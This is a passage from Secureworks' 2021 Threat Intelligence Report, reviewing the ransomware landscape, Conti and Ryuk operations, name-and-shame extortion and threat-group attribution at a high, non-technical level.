01
After the global uncertainties of 2020, I think we all hoped that 
2021 would shape into a degree of normality. But when it comes 
to cybersecurity, that has not been the case. We started the year 
looking at the aftermath of SolarWinds, and we haven’t looked back. 
From HAFNIUM to Colonial Pipeline to Kaseya, the headlines have kept 
coming all year long.

What has risen to the top is that threat actors continue to innovate 
and evolve tried-and-true techniques in order to broaden the threat 
landscape. The Secureworks® Counter Threat Unit™ analyzes trillions 
of security events every year that often lead to the discovery of early 
stage ransomware, business email compromise, and nation-state 
sponsored espionage attacks, and more. As a result, we are able to 
paint one of the most comprehensive views of the threat anywhere in 
the security industry.

In this year’s Secureworks Threat Intelligence Report, the team will 
provide insights and findings generated by coupling the expertise 
of our research group with direct observations from a vast pool of 
customer telemetry and incident response engagements. It is my hope, 
as leader of this talented team of threat researchers, that you will be 
able to use this summary of what we have seen day in and day out to 
make your own organization safer from the threats that really matter. 
And, as always, our entire Secureworks team is here for you. This 
annual Threat Intelligence Report is only one way we use our deep 
understanding of the threat, backed by 20+ years of experience, to 
strengthen security in the communities we serve. From our researchers 
to incident response to our adversary group to our operations 
teams to our product engineers who have built our Taegis™ XDR 
platform software from the ground up—we are one team dedicated to 
protecting your progress, enabled by technology.

We are honored to be part of your security journey and hope you get 
new insights out of the research we present here.

2021 State of the Threat: A Year in Review
The past year has seen headlines dominated by stories of cyberattacks: 
Russian supply chain attacks, Chinese espionage groups compromising 
tens of thousands of Microsoft Exchange servers, and widespread and 
brazen ransomware attacks by Russia-based cybercriminals.

Condemnations from the U.S. and their allies followed each of 
these attacks, aimed at shining a light on the perpetrators and holding 
hostile governments accountable for the malicious cyber activity they 
have conducted and enabled. The threat level to businesses globally 
remains high, especially as many organizations are rapidly pursuing IT 
transformation to support operations in a pandemic environment.

Amidst all this activity, Secureworks Counter Threat Unit (CTU™) 
researchers continue to track these threats and use their knowledge 
to develop insights and protections for Secureworks’ customers. Their 
high-level findings for the period June 2020 to June 2021 are, in order 
of risk presented to Secureworks’ customers:

## 02
## Executive 
## Summary and 
## Key Findings

Just like ransomware, other types of cybercrime 
continue to flourish. Business Email Compromise (BEC) 
remains a significant threat. A flourishing landscape of 
loaders and downloaders continues to service the demand 
for malware-based network access for all types of adversary. 
Law enforcement intervention against these threats, e.g. 
the Emotet takedown,  has led to tactical successes but is 
yet to cause significant strategic impact.

### [The Pervasiveness of Cobalt Strike](#table-of-contents)
### [Conclusion](#table-of-contents)

Ransomware remains the number one threat for 
most organizations. It rose eight percent as a proportion 
of IR engagements worked in Q1 and 2, 2021 compared 
to the previous year. There are very few other threats 
that can cause total loss of business operations for 
an extended period of time. Ransomware attacks are 
opportunistic - any organization that is perceived to have 
money can be a target - and most attacks occur due to 
gaps in security controls.

Both BEC attacks targeting single-factor Microsoft 
365 email accounts, and Russian espionage operations 
leveraging compromised Azure applications and stolen 
SAML token-signing certificates, e.g. the SolarWinds 
supply chain compromise, continue to show that 
identity is king. The role of security controls around 
authentication will remain crucial as more organizations 
move to cloud services or hybrid operating models.

01
02
2021 has seen significantly increased use of 
zero-day exploits by threat actors, compared to 
2020. But threat actors also continue to leverage 
known but unpatched vulnerabilities in mass 
scan-and-exploit attacks.

Despite the level of attention it attracts, state-
sponsored activity remains targeted and narrowly 
focused, according to the priorities of the country 
it originates from. CTU researchers continue to see 
significant levels of activity from groups affiliated with 
China, Iran, Russia and North Korea.

03
04
Cybercriminal and state-sponsored threat actors 
continue to leverage widely available offensive 
security tools (OSTs) in network intrusions. These 
tools are easy to use, carry no development cost, 
and are hard to attribute, making them an attractive 
proposition. Cobalt Strike, by far the most popular OST 
tool used by threat actors, featured in 19 percent of 
network intrusions.

This report lays out CTU researchers’ view of the significant 
developments in the threat landscape over the past year. 
Unsurprisingly, post-intrusion ransomware features extensively, as it 
remains the most significant threat facing Secureworks’ customers.

The report also explores developments in ransomware precursors. The 
deployment of ransomware is the final stage of an attack: the best time 
to detect ransomware attackers is in the hours and days prior to that 
moment. That makes understanding the tools and techniques threat 
actors use crucial. Scanning and exploiting vulnerable public-facing 
infrastructure, malware delivered via spam emails, and off-the-shelf 
penetration testing tools such as Cobalt Strike all feature heavily.

For a subset of organizations, nation state advanced persistent 
threat (APT) actors also form a significant threat. China, Iran, Russia, 
and North Korea have all impacted Secureworks’ customers in 
different ways over the past year. The report looks at the activities 
of each of those countries in turn. It also draws out the lessons  
from two high profile but very different APT attacks: the SolarWinds 
supply chain compromise and the exploitation of Microsoft Exchange 
Server vulnerabilities.

Throughout, the report will also focus on how attacks can be 
prevented. Customers can use this information to guide risk 
management decision-making, inform best practice, and prioritize 
resource allocation.

### The Secureworks  
### View of the Threat
Secureworks’ unique view of the threat landscape comes from a 
combination of the incident response engagements it carries out, the 
telemetry it monitors from the Taegis XDR platform, and the technical 
and tactical research carried out by the Counter Threat Unit into threat 
actor activity. Together, that all adds up to a unique level of visibility 
into threat actor intent, capability, and activity.

In the 12 months from July 2020, the Secureworks Incident 
Response team and Secureworks Counter Threat Unit conducted 
over 1,300+ incident response engagements, across a wide spectrum 
of industry sectors.

*   Secureworks processes approximately two trillion events 
every single week, gathered from security infrastructure in 
thousands of customer environments around the world.
*   CTU researchers gather and analyze data from internally 
generated and externally collected telemetry, from multiple 
sources of open-source information, including dark 
web forums, proprietary botnet emulation systems, and 
intelligence provided by partners.

The result is a vivid, yet fine-grained picture of threat actor activity that 
portrays both the thrust of their high-level tactics and the technical 
details of their tooling. This knowledge fuels the elite threat detection 
and integrated response actions that Taegis XDR delivers. It finds form 
in the expert threat intelligence products published every week by 
the CTU and is condensed in this analysis of the state of the threat 
landscape over the past year.

## 04
The post-intrusion ransomware landscape is thriving. Volume of 
incidents, number of ransomware operators, and average ransom 
demands all continue to increase. The ransomware-as-a-service<sup>1</sup> 
affiliate model allows operators to scale their operations and 
significantly lowers the barrier to entry. A successful ransomware 
attack can instantaneously cripple even the largest of organizations. 
All of this makes ransomware the single greatest threat facing 
Secureworks’ customers today. As a result, ransomware engagements 
account for more than half of the financial crime incidents worked by 
Secureworks incident responders.

Organizations that apply good security basics can demonstrably 
reduce their chances of falling victim to ransomware attacks, yet a 
substantial number continue to struggle with this. At the macro level, a 
coordinated response to the ransomware actors from international law 
enforcement and government policy looks promising but is yet to have 
a major effect.

## Ransomware Remains the Number 
## One Threat for Most Organizations

### How Secureworks 
### Carries Out Attribution
Threat group names used by Secureworks refer to observed 
activity clusters or intrusion sets. If CTU researchers attribute 
an attack to a group, it is because the indicators and the 
tactics, techniques, and procedures observed during the 
attack match or align with those seen in previous activity 
attributed to the group. Groups are also clusters of individuals, 
but individual threat actors may work for more than one group, 
or may change groups. 

The names are based on metals. In this report you will meet 
GOLD cybercriminal groups, as well as state-sponsored 
groups that are IRON (Russia), BRONZE (China), COBALT (Iran), 
or NICKEL (North Korea). The Secureworks Threat Group 
profiles are available on the Secureworks website with further 
information about most of the groups featured in this report.

### GOLD ULRICK – Back Refreshed 
### and With Different Tradecraft
GOLD ULRICK is the distributor of the Conti and Ryuk ransomware 
families. GOLD ULRICK is likely comprised of some or all of the same 
operators as GOLD BLACKBURN, the group responsible for the 
distribution of malware such as TrickBot, BazarLoader, and Buer 
Loader. Ryuk was one of the most prevalent ransomware strains 
encountered by Secureworks incident responders from late 2018 
through 2019. It seemed to have disappeared between February and 
September 2020 but attacks then resumed activity, alongside ‘name-
and-shame’ attacks using the Conti ransomware.

CTU researchers assess that since approximately late 2019, GOLD 
ULRICK began expanding its activities by working with various other 
operators who were recruited through existing trusted relationships 
rather than via adverts on underground forums. In August 2021, a 
persona claiming to be a disgruntled Conti affiliate released a swathe 
of information including tools and standard operating procedures 
provided to Conti affiliates by GOLD ULRICK.

Prior to February 2020, Ryuk attacks typically followed a consistent 
playbook: leveraging an existing TrickBot infection for initial access, 
deploying PowerShell Empire or Cobalt Strike across the environment, 
and then staging Ryuk on domain controllers and deploying it widely 
across the enterprise using either PSExec and batch scripts or Group 
Policy Objects. The script below is a PowerShell script used to create 
a Group Policy Object that weakens domain-joined systems’ security 
settings prior to deployment of Ryuk.

However, since September 2020 this expansion has resulted in 
divergent tactics, techniques and procedures during observed 
intrusions involving Ryuk and Conti deployments. In one example in 
early 2021, Secureworks incident responders helped an organization 
where the threat actor had accessed the environment using stolen 
VPN credentials and deployed Conti manually to a small number of 
systems using Remote Desktop Protocol (RDP). Not only is this a 
significant departure from previously observed tactics, techniques and 
procedures (TTPs), but the more localized deployment also caused far 
less impact to the affected organization, very unlike previous GOLD 
ULRICK intrusions where enterprises have experienced weeks or 
months of downtime.

### Innovation and Evolution
The last 18 months have seen constant evolution in the 
ransomware landscape, as criminal groups continue to explore 
ways to maximize profitability.

GOLD VILLAGE (Maze) pioneered the name-and-shame 
approach in December 2019. It was quickly followed by GOLD 
HERON (DoppelPaymer), GOLD SOUTHFIELD (REvil) and GOLD 
MANSARD (Nemty). Between March 2020 and June 2021, the 
number of active name-and-shame groups tracked by CTU 
researchers rose from four to 27. During that time, some groups 
launched and terminated operations, and others rebranded.

A small number of ransomware operators started adding Linux 
versions of ransomware to their repertoire, including 777, Babuk, 
HelloKitty, REvil, and DarkSide.

Linux ransomware often targets VMware ESXi servers, a hypervisor 
for deploying and hosting virtual machines. This shows the threat 
actors are devoting resources to improve their effectiveness against 
enterprise targets.

### Name-and-Shame Remains 
### the Name of the Game
Name-and-shame attacks allow for ‘double extortion’. Victims 
are under pressure to pay to recover their data (availability), but also 
to prevent it being published online (confidentiality). For some, 
the threat of sensitive business or client information being made 
public may be worse than the consequences of their systems being 
encrypted. The extra threat also comes with a deadline to pay, 
increasing the pressure to hand over the ransom to avoid further pain 
in an already painful situation.

Name-and-shame has become the predominant operating method 
for most ransomware groups, with victims being added to public leak 
sites at a worrying rate. The most active name-and-shame ransomware 
group over the past year was GOLD PHANTOM’s Egregor, adding an 
average of 60 victims a month to its leak site between its launch in 
September 2020 and its apparent demise at the end of 2020. GOLD 
ULRICK added an average of 23 new Conti victims a month across 
the entire period. Grief, the successor to DoppelPaymer launched by 
GOLD HERON at the end of May 2021, added 23 during June alone.
